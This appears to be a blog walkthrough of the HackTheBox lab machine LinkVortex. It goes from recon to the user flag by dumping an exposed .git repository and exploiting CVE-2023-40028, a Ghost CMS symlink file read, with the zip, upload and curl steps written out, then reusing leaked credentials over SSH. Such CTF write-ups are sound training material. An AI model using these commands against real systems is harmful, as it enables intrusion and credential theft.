---
title: "LinkVortex"
date: 2026-07-08 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, git-exposure, ghost-cms, cve-2023-40028, arbitrary-file-read, symlink, credential-reuse]
image:
    path: /assets/Images/LinkVortex-avatar.png
    alt: LinkVortex
description: "A dev subdomain leaks its .git directory, whose history hides a hardcoded Ghost admin password; the Ghost 5.58 importer (CVE-2023-40028) reads arbitrary files via a symlink in an imported ZIP, leaking SSH credentials from the Ghost config for the user flag."
---
## Overview

LinkVortex is an easy-difficulty Linux box themed around symbolic links. The foothold is a chain of two classic web mistakes: a development subdomain that serves its `.git` directory, and a Ghost CMS instance vulnerable to an authenticated arbitrary file read (CVE-2023-40028). Dumping the repo leaks a hardcoded admin password; logging into Ghost and abusing the importer's symlink handling leaks SSH credentials from the Ghost config file, which log straight in for `user.txt`. This post covers recon through the user flag.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 201.7,221.2 124.1,185.6 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Heavy subdomain/.git enumeration leaks a hardcoded password, then named CVE-2023-40028 symlink file-read drives the foothold; balanced enum-plus-CVE realism with a touch of symlink crafting.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 8.9p1 | Ubuntu |
| 80/tcp | Apache httpd | redirects to `linkvortex.htb`, Ghost 5.58 |

```bash
nmap -sC -sV 10.10.11.47
```

Port 80 redirects to `http://linkvortex.htb/`, so add the hostname and scan again:

```bash
echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
nmap -sC -sV linkvortex.htb
```

The second scan fingerprints the site as **Ghost 5.58** ("BitByBit Hardware" blog) and surfaces a `robots.txt` with four disallowed entries including `/ghost/` — the Ghost admin login. The blog posts are authored by `admin@linkvortex.htb`, a useful detail for later. The login page exists but we have no password yet.

## Enumeration

With no obvious foothold on the main site, fuzz for subdomains:

```bash
ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt \
  -H "Host: FUZZ.linkvortex.htb" -u http://linkvortex.htb/ -ic -fs 230
```

This returns `dev`. Add it and fuzz for content:

```bash
echo "10.10.11.47 dev.linkvortex.htb" | sudo tee -a /etc/hosts
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -u http://dev.linkvortex.htb/FUZZ -ic -t 20
```

The `dev` host shows only a "LAUNCHING SOON" page in the browser, but the fuzzer finds the real prize: `.git/`, `.git/config`, `.git/HEAD`, and a 707 KB `.git/index` all return `200`. The entire `.git` directory is exposed.

## Foothold

**1 — Dump the exposed repository.** `git-dumper` reconstructs the working tree from the exposed objects:

```bash
git_dumper.py http://dev.linkvortex.htb/.git gitdump
cd gitdump && git status
```

The status shows staged changes, including a modified `ghost/core/test/regression/api/admin/authentication.test.js`. Restore the staged changes and diff:

```bash
git restore --staged . && git diff
```

The diff swaps a placeholder for a real password:

```diff
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
```

Combined with the author email seen earlier, `admin@linkvortex.htb` : `OctopiFociPilfer45` logs into the Ghost dashboard at `http://linkvortex.htb/ghost`.

**2 — CVE-2023-40028 arbitrary file read.** Ghost 5.58's content importer accepts a ZIP and preserves symbolic links inside it, letting an authenticated user read any file on the host. Build a symlink disguised as a PNG, zip it so the link is stored as a link, and import it:

```bash
mkdir -p exploit/content/images/
ln -s /etc/passwd exploit/content/images/test-file.png
zip -r -y exploit.zip exploit/
```

Upload `exploit.zip` via **Settings → Labs → Import content**, then fetch the symlink back through the public images path:

```bash
curl http://linkvortex.htb/content/images/test-file.png
```

This returns `/etc/passwd`, confirming the read. A public PoC (`CVE-2023-40028.sh`, with `GHOST_URL` pointed at `http://linkvortex.htb`) automates the scaffold/zip/upload/fetch into a `file>` prompt:

```bash
chmod +x CVE-2023-40028.sh
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
```

**3 — Read the Ghost config for SSH creds.** Ghost stores its runtime config (including SMTP auth) in `/var/lib/ghost/config.production.json`. Request it at the `file>` prompt:

```
file> /var/lib/ghost/config.production.json
```

```json
"auth": {
    "user": "bob@linkvortex.htb",
    "pass": "fibber-talented-worth"
}
```

The password is reused for the host account, so it logs straight in over SSH:

```bash
ssh bob@linkvortex.htb
```

## User flag

```bash
bob@linkvortex:~$ cat user.txt
[redacted]
```

The privilege escalation — a TOCTOU race in a sudo-able `clean_symlink.sh` that ultimately leaks root's SSH key — is left as an exercise; this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/LinkVortex-avatar.png" alt="LinkVortex" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
